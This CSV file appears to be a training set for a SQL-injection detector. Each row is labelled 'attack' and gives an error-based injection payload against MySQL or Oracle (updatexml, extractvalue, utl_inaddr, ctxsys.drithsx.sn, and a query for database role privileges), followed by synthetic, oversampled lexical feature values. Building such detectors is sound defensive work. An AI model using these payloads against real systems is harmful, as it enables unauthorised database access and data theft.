id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000237,attack,error,1%'  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  '%'  =  ',nearest_attack_euclidean,R000113,0.9644553119973259,345.6993043231114,33.46013913537772,3.555261214544612,88.31888691697819,46.84055654151091,148.0,62.53986086462227,0.25540897296824977,0.1355437567600431,0.42814000000150393,0.1809072702702032,4.0,0.0,0.0,0.0,1.1102230246251565e-16,3.0,0.0,30.0,2.0,1.6195825938668222,0.4601391353777262,22.999999999999996,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000238,attack,error,"1"" where 4345  =  4345 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --",nearest_attack_euclidean,R000020,1.2352970763372988,345.53889153729335,34.538891537293374,3.6818073723692932,95.34722884323344,51.65277115676656,140.0,58.538891537293374,0.2759231353331659,0.14950210748534368,0.4051668979223901,0.16940785925910035,0.0,1.8083373059400616,1.730554231353313,0.0,1.1102230246251565e-16,3.0,0.0,28.0,2.7755575615628914e-17,3.0,0.0,24.730554231353313,0.0,1.0,0.7305542313533128,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.7305542313533128,1.0,1.0,0.26944576864668707,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000239,attack,error,"-9740""   )    )    as pxkx where 5305  =  5305 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000128,0.7039395070598863,233.8643266013466,40.79012725298078,3.9128935014289064,71.69139978278861,43.32101802384626,94.06178154173095,24.79012725298078,0.30648600194744935,0.185047620556184,0.40216989739263814,0.10629648010372851,0.0,1.0,1.0,0.0,1.0,1.790127252980782,0.0,15.790127252980781,0.20987274701921813,-1.1102230246251565e-16,3.0,3.7901272529807817,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,1.0,0.0,0.7901272529807819,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.790127252980782
SMOTE_000240,attack,error,"1'   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  'eugs'  =  'eugs",nearest_attack_euclidean,R000025,1.7210424413157497,191.98182458758941,27.49545614689736,3.460597394588664,41.450017615870955,41.05452623723169,83.99091229379472,25.486368440692075,0.21563097292084268,0.21419463454848936,0.43748730046259016,0.13268709206807783,1.9818245875894374,0.0,0.0,0.0,1.1102230246251565e-16,2.0,0.0,16.0,2.7755575615628914e-17,-1.1102230246251565e-16,5.504543853102641,2.0,0.4954561468973593,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000241,attack,error,"1""   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  ""ymhg""  =  ""ymhg",nearest_attack_euclidean,R000085,0.9757559504277659,339.8871646594661,38.5557123036849,3.907586844768079,110.38928075921224,55.0,134.88716465946615,39.61071924078776,0.32526038495330784,0.16195859151974384,0.3963361588809548,0.11644486464599348,0.0,4.0,0.0,0.0,2.0,1.722143848157552,0.0,24.88857539263021,2.7755575615628914e-17,-1.1102230246251565e-16,6.0,4.722143848157552,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,6.0,3.0,0.0,1.0,1.277856151842448,0.7221438481575521,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000242,attack,error,"1'   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  'ibrj'  =  'ibrj",nearest_attack_euclidean,R000142,0.1785055995097549,223.7366462009851,30.866861541234417,3.4172092495372004,55.0,32.0,105.13606157728185,31.600584623703256,0.24623166618145784,0.1432620603237573,0.4693245015892398,0.14118177190554507,4.0,0.0,0.0,0.0,1.0,2.0,0.0,19.600584623703256,2.7755575615628914e-17,-1.1102230246251565e-16,4.0,3.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,3.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000243,attack,error,"-9176'   )    )    as eunw where 5978  =  5978 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000129,0.05619031108643038,239.95652341028048,40.89565234102805,3.9138133198193903,73.68695702308415,45.0,96.3739140461683,24.895652341028047,0.30708724789625663,0.18760362078326315,0.401557058904815,0.10375207241566527,1.0,0.0,1.0,0.0,1.0,2.0,0.0,15.895652341028049,2.7755575615628914e-17,-1.1102230246251565e-16,3.0,4.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,7.0
SMOTE_000244,attack,error,"1""  )   as zbhs where 2017  =  2017 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",nearest_attack_euclidean,R000087,0.0005714797977810429,325.985114286752,40.0,4.022114563272166,108.99312967080861,63.0,118.99312967080861,34.99885494513477,0.3343497796451091,0.19326072443535372,0.36502608511103823,0.10736341080849894,0.0,1.0,2.0,0.0,2.0,2.0,0.0,20.99885494513477,2.7755575615628914e-17,-1.1102230246251565e-16,6.0,7.0,0.0,1.0,1.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,6.0,3.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000245,attack,error,"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'kdxg' like 'kdxg",nearest_attack_euclidean,R000050,0.09709467078171004,312.6476256327109,38.02072790395818,4.070306618502356,112.77199305646002,55.0,110.93781628812546,33.93781628812546,0.36068185098626687,0.17592803503800297,0.3548446815144672,0.10854543246126303,3.9170883841672794,0.0,0.0,0.0,2.0,1.0,0.0,20.0,2.7755575615628914e-17,-1.1102230246251565e-16,6.0,4.0,0.97927209604182,0.0,0.0,0.020727903958180152,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,6.0,3.0,0.0,1.0,0.97927209604182,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,13.979272096041822
SMOTE_000246,attack,error,"-4095'  )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000108,0.08473476286434402,206.04809938827907,40.04809938827906,3.883262054438683,63.0,37.0,83.0,23.048099388279063,0.3057541798822386,0.17956991516893378,0.4028189988924731,0.11185690605635451,1.0,0.0,1.0,0.0,1.0,1.0,0.0,15.0,0.04809938827906418,-1.1102230246251565e-16,3.0,3.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.0
SMOTE_000247,attack,error,"1 where 7932  =  7932 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R000074,0.10899675019430691,191.48827716071688,31.097655432143377,3.6218892007467276,48.22786267500121,40.0,79.19531086428675,24.065103621428918,0.2518193581866218,0.20892769058027055,0.41358029988771755,0.12567265134539007,0.03255181071445912,0.0,2.0,0.0,1.0,2.0,0.0,14.032551810714459,2.7755575615628914e-17,-1.1102230246251565e-16,4.0,5.0,0.03255181071445912,0.0,1.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,3.0,0.0,1.0,1.0,0.03255181071445912,0.9674481892855409,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000248,attack,error,"1  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  6986  =  6986",nearest_attack_euclidean,R000123,2.4504321542459713,218.91047791033424,30.977619477583563,3.875562097510829,72.91047791033425,45.0,79.02238052241644,21.97761947758356,0.3328382474691584,0.20563204701293064,0.36118413973287716,0.10034556578503383,0.0,0.4888097387917808,0.9776194775835616,0.0,1.1102230246251565e-16,2.0,0.0,13.51119026120822,2.7755575615628914e-17,-1.1102230246251565e-16,5.0,2.977619477583562,0.0,0.48880973879178086,0.48880973879178086,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,1.0,0.0,0.4888097387917808,0.0,0.5111902612082193,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000249,attack,error,"-1272' or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000097,1.295768045985557,210.37143514360974,38.468571757180484,3.9137631994214863,65.34285878590244,40.7485740574439,81.81143054308293,22.46857175718049,0.3107429864685391,0.19323563821689432,0.3890897134871907,0.10693166182737587,1.0,0.0,1.0,0.0,1.0,1.4685717571804882,0.0,14.0,2.7755575615628914e-17,-1.1102230246251565e-16,3.0,3.4685717571804884,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,1.0,0.0,0.46857175718048816,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.468571757180488
SMOTE_000250,attack,error,"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj",nearest_attack_euclidean,R000095,0.6735438179092463,191.73701599652236,30.26298400347763,3.6252622683757685,52.28029600811447,32.73701599652237,80.47403199304475,26.24567199884079,0.2727839821271025,0.17070182823573857,0.4196393330530112,0.13687485658414772,4.0,0.0,0.0,0.0,0.7543280011592096,2.0,0.0,14.49134399768158,2.7755575615628914e-17,-1.1102230246251565e-16,4.24567199884079,2.7543280011592097,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,2.5086560023184195,0.0,0.0,0.7543280011592097,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.262984003477629
SMOTE_000251,attack,error,"-4838'   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000035,0.08333895159172192,212.12222075968964,39.12539703433005,3.818841464955268,63.0,37.0,88.24761779401969,23.87460296566995,0.29703496267239965,0.17444910506156808,0.4159684794775016,0.11254745278853065,1.0,0.0,1.0,0.0,1.0,1.0,0.0,15.874602965669949,2.7755575615628914e-17,-1.1102230246251565e-16,3.0,3.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.0
SMOTE_000252,attack,error,-4615' or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    ) ,nearest_attack_euclidean,R000028,2.0222844084732934,334.42400909821976,34.50361861437049,3.6748364491000105,95.9421021700722,46.51085584311146,134.97828831377709,56.992762771259024,0.28641911166988776,0.13935556321751263,0.4037305082545962,0.17049481685800336,2.489144156888539,0.0,0.5036186143704868,0.0,1.1102230246251565e-16,2.0,0.0,28.0,2.7755575615628914e-17,3.0,0.0,22.503618614370485,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.992762771259026,0.503618614370487,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.496381385629514
SMOTE_000253,attack,error,"1'||  (  select 'vsfg' where 3547  =  3547 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161   )    )   ||'",nearest_attack_euclidean,R000048,0.3861089349844603,191.17899868624718,34.607000437917605,3.974519811907657,49.916998978192254,47.0,66.26199970805493,28.0,0.2609748444916799,0.2459028580202693,0.34662697781640106,0.1464953196716498,4.0,0.0,0.0,0.0,1.1102230246251565e-16,2.0,0.0,12.0,2.7755575615628914e-17,-1.1102230246251565e-16,6.0,6.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,0.0,1.0,0.13099985402746406,0.8690001459725359,0.13099985402746406,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.130999854027464
SMOTE_000254,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000003,0.5625258761383253,247.58549227154768,43.64363845953042,4.444252764579016,143.01093843342596,2.0,75.93091537859128,26.643638459530425,0.5769364571606794,0.008105703522663182,0.3071655277261615,0.10779231159049595,3.0,0.0,0.0,0.0,1.1102230246251565e-16,3.8218192297652136,0.0,10.0,2.7755575615628914e-17,6.821819229765214,1.0,3.821819229765213,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,2.7755575615628914e-17,2.0,0.0,1.8218192297652134,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.821819229765214
SMOTE_000255,attack,error,"1'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  'eiau'  =  'eiau",nearest_attack_euclidean,R000100,0.07552497846206456,219.04349062158218,31.043490621582194,3.857173373776635,77.17396248632878,37.0,79.91301875683561,24.956509378417806,0.3523194065305972,0.1689163729141025,0.3648292207974351,0.11393499975786518,4.0,0.0,0.0,0.0,1.1102230246251565e-16,1.9565093784178074,0.0,14.0,2.7755575615628914e-17,-1.1102230246251565e-16,5.0,1.956509378417807,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000256,attack,error,"1'+  (  select 'nhlx' where 2291  =  2291 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   +'",nearest_attack_euclidean,R000114,1.0288785221221455,299.61531759683265,38.0,4.026979851761091,111.38468240316733,43.0,108.0,37.23063519366533,0.3717625916131747,0.1435177407283857,0.36046316275966633,0.12425650489877323,3.2306351936653317,0.0,0.0,0.0,2.0,2.0,0.0,20.0,2.7755575615628914e-17,2.0,5.0,6.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,4.0,0.0,1.0,2.0,0.38468240316733415,0.6153175968326657,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,11.0
SMOTE_000257,attack,error,"1"" where 2131  =  2131 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",nearest_attack_euclidean,R000094,0.9036304128152816,347.9682907927527,34.0,3.5929615502296333,89.25073473159566,55.37463263420217,144.74926526840434,58.59365815855054,0.2565837196511946,0.15910500080152262,0.41592493421626603,0.16838634533101682,0.0,1.0,2.0,0.0,1.1102230246251565e-16,3.0,0.0,29.187316317101086,2.7755575615628914e-17,1.2190255243483714,0.5936581585505429,25.0,0.0,1.0,1.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000258,attack,error,"1,  (  select 6825 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6825  =  6825,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",nearest_attack_euclidean,R000111,0.2352124717085,247.24964535476528,34.62482267738264,3.971574432015452,94.0,34.62482267738264,89.0,29.624822677382642,0.38018839064798166,0.14003439608861315,0.3599656039113869,0.11981160935201837,0.0,0.0,0.0,0.0,2.0,1.0,0.0,18.0,2.7755575615628914e-17,2.0,5.624822677382641,3.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,3.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,8.0
SMOTE_000259,attack,error,1%'  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  '%'  =  ',nearest_attack_euclidean,R000113,0.4290616671819332,346.10183115324594,32.83494183941269,3.567151050340148,91.75241275911904,45.0,147.00965103647613,62.33976735765076,0.2651500545895208,0.13006558442178545,0.4247240278515764,0.18006033313711733,3.669883678825378,0.0,0.0,0.0,1.1102230246251565e-16,2.9174709197063446,0.0,29.917470919706346,1.8349418394126888,3.0,0.0,22.917470919706343,0.9174709197063446,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.9174709197063446,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.917470919706345
SMOTE_000260,attack,error,"1%' and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and '%'  =  '",nearest_attack_euclidean,R000109,0.23671389614070287,343.5646779386621,33.88706441226758,3.5416774790572605,84.9034847018594,48.5482576490703,148.0,62.11293558773242,0.24709679891667635,0.14132722725978242,0.4307867335635368,0.18078924026000442,4.0,0.0,0.0,0.0,1.1102230246251565e-16,3.0,0.0,30.0,2.0,0.3388067631972743,0.8870644122675753,22.999999999999996,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
